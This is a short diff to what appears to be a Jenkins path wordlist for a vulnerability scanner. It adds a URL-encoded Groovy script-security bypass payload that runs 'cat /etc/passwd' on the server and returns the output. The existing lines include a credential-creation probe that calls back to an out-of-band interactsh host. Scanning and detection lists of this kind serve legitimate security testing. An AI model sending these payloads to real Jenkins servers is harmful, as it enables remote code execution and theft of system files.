@@ -1,2 +1,5 @@
 /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://{{interactsh-url}}
 /git/notifyCommit?url={{randstr}}&branches={{randstr}}
+/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=class%20abcd{abcd(){def%20proc=%22cat%20/etc/passwd%20%22.execute();def%20os=new%20StringBuffer();proc.waitForProcessOutput(os,%20System.err);throw%20new%20Exception(os.toString())}}
+/whoAmI/
+/jenkins/
